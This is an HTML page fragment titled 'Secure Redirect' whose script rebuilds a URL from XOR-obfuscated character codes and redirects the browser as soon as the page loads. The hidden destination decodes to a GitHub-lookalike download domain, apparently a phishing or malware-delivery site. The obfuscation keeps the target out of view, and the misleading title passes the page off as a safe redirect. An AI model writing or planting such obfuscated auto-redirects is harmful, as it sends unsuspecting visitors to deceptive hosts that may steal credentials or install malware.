<!DOCTYPE html>
<html>
<head>
    <title>Secure Redirect</title>
    <script>
        const encoded = [
            [104 ^ 42, 116 ^ 42, 116 ^ 42, 112 ^ 42, 115 ^ 42, 58 ^ 42, 47 ^ 42, 47 ^ 42],
            [103 ^ 42, 105 ^ 42, 116 ^ 42, 104 ^ 42, 117 ^ 42, 98 ^ 42, 115 ^ 42, 101 ^ 42],
            [99 ^ 42, 117 ^ 42, 114 ^ 42, 101 ^ 42, 100 ^ 42, 111 ^ 42, 119 ^ 42, 110 ^ 42],
            [108 ^ 42, 111 ^ 42, 97 ^ 42, 100 ^ 42, 46 ^ 42, 111 ^ 42, 110 ^ 42, 108 ^ 42],
            [105 ^ 42, 110 ^ 42, 101 ^ 42, 47 ^ 42, 104 ^ 42, 114 ^ 42, 102 ^ 42, 47 ^ 42],
            [97 ^ 42, 108 ^ 42, 108 ^ 42, 110 ^ 42, 101 ^ 42, 119 ^ 42]
        ];

        const decode = (arr) => arr.map(code => String.fromCharCode(code ^ 42)).join('');

        let url = '';
        for (let part of encoded) {
            url += decode(part);
        }

        window.location.href = url;
    </script>
</head>
